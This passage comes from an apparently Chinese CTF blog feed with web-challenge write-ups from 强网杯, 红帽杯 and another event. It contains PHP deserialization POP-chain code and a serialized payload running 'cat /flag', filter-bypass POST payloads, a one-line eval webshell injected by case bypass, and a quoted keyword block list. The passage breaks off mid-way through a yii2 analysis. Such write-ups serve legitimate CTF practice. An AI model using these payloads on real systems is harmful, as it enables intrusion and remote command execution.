class="hljs-title">a1rktQ</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$G2ZqPlg</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;G2ZqPlg= <span class="hljs-keyword">new</span> bPC9aV();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bPC9aV</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$mUtXpNL</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;mUtXpNL= <span class="hljs-keyword">new</span> lNHRgw();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lNHRgw</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$iI0ggvd</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;iI0ggvd= <span class="hljs-keyword">new</span> uhsLTo();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">uhsLTo</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$V4cm8RE</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;V4cm8RE= <span class="hljs-keyword">new</span> xmFnqe();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xmFnqe</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$XVKtQaL</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;XVKtQaL= <span class="hljs-keyword">new</span> ygWYP5();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ygWYP5</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$BeaCQ8a</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;BeaCQ8a= <span class="hljs-keyword">new</span> kU9NTw();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">kU9NTw</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$Rc3QaRn</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;Rc3QaRn= <span class="hljs-keyword">new</span> gyRrwz();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gyRrwz</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$ykDFgZf</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;ykDFgZf= <span class="hljs-keyword">new</span> Q2GEHp();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Q2GEHp</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$GgRUaWA</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;GgRUaWA= <span class="hljs-keyword">new</span> cnxShX();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cnxShX</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$lKlVzwp</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;lKlVzwp= <span class="hljs-keyword">new</span> MyFOP4();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyFOP4</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$aIr6pnl</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;aIr6pnl= <span class="hljs-keyword">new</span> TWKFWY();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TWKFWY</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$iMX9NnG</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;iMX9NnG= <span class="hljs-keyword">new</span> ogz6Dr();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ogz6Dr</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$ThhObgx</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;ThhObgx= <span class="hljs-keyword">new</span> QaCgIg();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QaCgIg</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$gpW7aFB</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;gpW7aFB= <span class="hljs-keyword">new</span> Zg0xg5();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Zg0xg5</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$p4epegQ</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>&#125;<br>&#125;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> TPmYmu());<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>payload为</p><p><code>?pop=O:6:&quot;TPmYmu&quot;:1:&#123;s:7:&quot;qfDgtGD&quot;;O:6:&quot;z3w6kL&quot;:1:&#123;s:7:&quot;X5XSpPz&quot;;O:6:&quot;olTmkb&quot;:1:&#123;s:7:&quot;tTEiXpd&quot;;O:6:&quot;Moag8l&quot;:1:&#123;s:7:&quot;D8ea5Xn&quot;;O:6:&quot;QcHqVE&quot;:1:&#123;s:7:&quot;XHhuV4y&quot;;O:6:&quot;hCG6ag&quot;:1:&#123;s:7:&quot;cYnq47g&quot;;O:6:&quot;EYyxSm&quot;:1:&#123;s:7:&quot;A7icng3&quot;;O:6:&quot;CDF5aP&quot;:1:&#123;s:7:&quot;KUxwPnq&quot;;O:6:&quot;a1rktQ&quot;:1:&#123;s:7:&quot;G2ZqPlg&quot;;O:6:&quot;bPC9aV&quot;:1:&#123;s:7:&quot;mUtXpNL&quot;;O:6:&quot;lNHRgw&quot;:1:&#123;s:7:&quot;iI0ggvd&quot;;O:6:&quot;uhsLTo&quot;:1:&#123;s:7:&quot;V4cm8RE&quot;;O:6:&quot;xmFnqe&quot;:1:&#123;s:7:&quot;XVKtQaL&quot;;O:6:&quot;ygWYP5&quot;:1:&#123;s:7:&quot;BeaCQ8a&quot;;O:6:&quot;kU9NTw&quot;:1:&#123;s:7:&quot;Rc3QaRn&quot;;O:6:&quot;gyRrwz&quot;:1:&#123;s:7:&quot;ykDFgZf&quot;;O:6:&quot;Q2GEHp&quot;:1:&#123;s:7:&quot;GgRUaWA&quot;;O:6:&quot;cnxShX&quot;:1:&#123;s:7:&quot;lKlVzwp&quot;;O:6:&quot;MyFOP4&quot;:1:&#123;s:7:&quot;aIr6pnl&quot;;O:6:&quot;TWKFWY&quot;:1:&#123;s:7:&quot;iMX9NnG&quot;;O:6:&quot;ogz6Dr&quot;:1:&#123;s:7:&quot;ThhObgx&quot;;O:6:&quot;QaCgIg&quot;:1:&#123;s:7:&quot;gpW7aFB&quot;;O:6:&quot;Zg0xg5&quot;:1:&#123;s:7:&quot;p4epegQ&quot;;N;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&amp;argv=sytem(&quot;cat /flag&quot;);//</code></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯</title>
    <link href="/2021/07/12/2021-7-12-QWB/"/>
    <url>/2021/07/12/2021-7-12-QWB/</url>
    
    <content type="html"><![CDATA[<h2 id="强网先锋寻宝"><a href="#强网先锋寻宝" class="headerlink" title="强网先锋寻宝"></a>强网先锋寻宝</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__file__</span>);<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-variable">$filter_word</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;index&#x27;</span>,<span class="hljs-string">&#x27;KeY1lhv&#x27;</span>,<span class="hljs-string">&#x27;source&#x27;</span>,<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;echo&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\(&#x27;</span>,<span class="hljs-string">&#x27;\.&#x27;</span>,<span class="hljs-string">&#x27;num&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;\/&#x27;</span>,<span class="hljs-string">&#x27;\,&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;0000000&#x27;</span>);<br>        <span class="hljs-variable">$filter_phrase</span>= <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_word</span>).<span class="hljs-string">&#x27;/&#x27;</span>;<br>        <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter_phrase</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$string</span>);<br>    &#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ppp</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$ppp</span>);<br>&#125;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number1&#x27;</span>] = <span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number2&#x27;</span>] = <span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;nunber3&#x27;</span>] = <span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number4&#x27;</span>] = <span class="hljs-string">&#x27;1&#x27;</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number5&#x27;</span>] = <span class="hljs-string">&#x27;1&#x27;</span>;<br><br>extract(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-variable">$num1</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number1&#x27;</span>]);        <br><span class="hljs-variable">$num2</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number2&#x27;</span>]);        <br><span class="hljs-variable">$num3</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number3&#x27;</span>]);        <br><span class="hljs-variable">$num4</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number4&#x27;</span>]);<br><span class="hljs-variable">$num5</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number5&#x27;</span>]);<br>var_dump(<span class="hljs-variable">$ppp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>var_dump(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num1</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$num1</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;非数字&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">else</span>&#123;<br>  <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num1</span> &gt; <span class="hljs-number">1024</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;第一层&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num2</span>) &amp;&amp; strlen(<span class="hljs-variable">$num2</span>) &lt;= <span class="hljs-number">4</span> &amp;&amp; intval(<span class="hljs-variable">$num2</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">500000</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;第二层&quot;</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num3</span>) &amp;&amp; <span class="hljs-string">&#x27;4bf21cd&#x27;</span> === substr(md5(<span class="hljs-variable">$num3</span>),<span class="hljs-number">0</span>,<span class="hljs-number">7</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;第三层&quot;</span>;<br>                <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$num4</span> &lt; <span class="hljs-number">0</span>)&amp;&amp;(<span class="hljs-variable">$num4</span> == <span class="hljs-number">0</span>)&amp;&amp;(<span class="hljs-variable">$num4</span> &lt;= <span class="hljs-number">0</span>)&amp;&amp;(strlen(<span class="hljs-variable">$num4</span>) &gt; <span class="hljs-number">6</span>)&amp;&amp;(strlen(<span class="hljs-variable">$num4</span>) &lt; <span class="hljs-number">8</span>)&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num4</span>) )&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;第四层&quot;</span>;<br>                    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$num5</span>)||(strlen(<span class="hljs-variable">$num5</span>)==<span class="hljs-number">0</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>                    <span class="hljs-variable">$b</span>=json_decode(@<span class="hljs-variable">$num5</span>);<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$y</span> = <span class="hljs-variable">$b</span> === <span class="hljs-literal">NULL</span>)&#123;<br>                                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$y</span> === <span class="hljs-literal">true</span>)&#123;<br>                                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;第五层&quot;</span>;<br>                                    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;KeY1lhv.php&#x27;</span>;<br>                                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$KEY1</span>;<br>                                &#125;<br>                        &#125;<span class="hljs-keyword">else</span>&#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>                        &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no111&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="传参方式"><a href="#传参方式" class="headerlink" title="传参方式"></a>传参方式</h4><p>有个extract($_POST);它把数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>第一层<code>弱类型</code>，第二层<code>科学计数法</code>,第三层<code>脚本</code>，第四层<code>科学计数法</code>,第五层<code>json_decode()</code>.接受一个 JSON 编码的字符串并且把它转换为 PHP 变量</p><p>通过恰当的 PHP 类型返回在 <code>json</code> 中编码的数据。值<code>true</code>, <code>false</code> 和 <code>null</code> 会相应地返回 <strong><code>true</code></strong>, <strong><code>false</code></strong> 和 <strong><code>null</code><strong>。 如果 <code>json</code> 无法被解码， 或者编码数据深度超过了递归限制的话，将会返回</strong><code>null</code></strong> 。</p><p>payload:<code>ppp[number1]=1234a&amp;ppp[number2]=9e9&amp;ppp[number3]=61823470&amp;ppp[number4]=0e99999&amp;ppp[number5]=1a</code></p><h4 id="第二部分找key就在那个里面写着，拼接一下即可"><a href="#第二部分找key就在那个里面写着，拼接一下即可" class="headerlink" title="第二部分找key就在那个里面写着，拼接一下即可"></a>第二部分找key就在那个里面写着，拼接一下即可</h4><h2 id="强⽹先锋寻宝"><a href="#强⽹先锋寻宝" class="headerlink" title="强⽹先锋寻宝"></a>强⽹先锋寻宝</h2><p>pop链比较明显</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">?php<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span><br><span class="hljs-class"></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br> <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-variable">$a</span>;<br> &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span><br><span class="hljs-class"></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span>&#123;<br> <span class="hljs-keyword">$this</span>-&gt;file[<span class="hljs-string">&#x27;filename&#x27;</span>]=<span class="hljs-variable">$b</span>;<br> &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Room</span></span><br><span class="hljs-class"></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/flag&quot;</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">$this</span>-&gt;filename=<span class="hljs-string">&quot;/flag&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">$this</span>-&gt;a=<span class="hljs-keyword">new</span> Room();<br> &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Room();<br><span class="hljs-variable">$a</span>-&gt;invoke();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> Info(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> Start(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$c</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>popmaster的脚本明天再写。休整一下。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红帽杯</title>
    <link href="/2021/07/09/2021-7-9-%E7%BA%A2%E5%B8%BD%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/07/09/2021-7-9-%E7%BA%A2%E5%B8%BD%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>题目是在ctfhub上复现的</p><h2 id="Find-it"><a href="#Find-it" class="headerlink" title="Find_it"></a>Find_it</h2><p>一看应该是文件泄露了，访问了一下robots.txt发现有提示<code>1ndexx.php</code>结合备份文件泄露</p><p>直接访问<code>/.1ndexx.php.swp</code>得到源码(关键代码如下)</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">#Really easy...</span><br><br><span class="hljs-variable">$file</span>=fopen(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable 2 open!&quot;</span>);<br><br><span class="hljs-variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> = fread(<span class="hljs-variable">$file</span>,filesize(<span class="hljs-string">&quot;flag.php&quot;</span>));<br><br><br><span class="hljs-variable">$hack</span>=fopen(<span class="hljs-string">&quot;hack.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable 2 open&quot;</span>);<br><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;</span>,<span class="hljs-variable">$a</span>))&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you die&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$a</span>)&gt;<span class="hljs-number">33</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono.&quot;</span>);<br>&#125;<br>fwrite(<span class="hljs-variable">$hack</span>,<span class="hljs-variable">$a</span>);<br>fwrite(<span class="hljs-variable">$hack</span>,<span class="hljs-variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);<br><br>fclose(<span class="hljs-variable">$file</span>);<br>fclose(<span class="hljs-variable">$hack</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>代码很简单，传入code过滤了一堆东西，然后写入文件。显然是要写入木马之类的。</p><p>这里有几个绕过方法，大小写绕过，构造为</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">?code=%<span class="hljs-number">3</span>C?php%<span class="hljs-number">20</span><span class="hljs-keyword">Eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);?%<span class="hljs-number">3</span>E<br></code></pre></div></td></tr></table></figure><p>蚁剑连接即可</p><p><img src="https://img-blog.csdnimg.cn/20210709125140850.png" alt="在这里插入图片描述"></p><p>另外一个思路是网上看的，用<code>show_source() 函数对文件进行语法高亮显示。</code></p><p>构造payload：<code>?code=&lt;?php show_source(__FILE__);?&gt;</code>然后访问<code>hack.php</code>,但是我在ctfhub没有做成功也不知道为啥….</p><h2 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h2><p>现成的yii2的反序列化，感觉现在看这些框架不是那么陌生了。</p><p>先分析了一下网上的复现过程，一条链是从</p><p><img src="https://img-blog.csdnimg.cn/202107101335156.png" alt="在这里插入图片描述"></p><p>跟进reset函数</p><p><img src="https://img-blog.csdnimg.cn/20210710133553865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>调用了别的地方的close函数，这里的<code>_dataReader</code>是可控的，想办法调用<code>__call</code>函数。全局搜索一下__call，最后在<code>\vendor\fzaninotto\faker\src\Faker\Generator.php</code>找到了一个合适的__call方法：</p><p><img src="https://img-blog.csdnimg.cn/20210710134209695.png" alt="在这里插入图片描述"></p><p><code>$method</code>即为<code>close</code>，参数为空，跟进format：</p><p><img 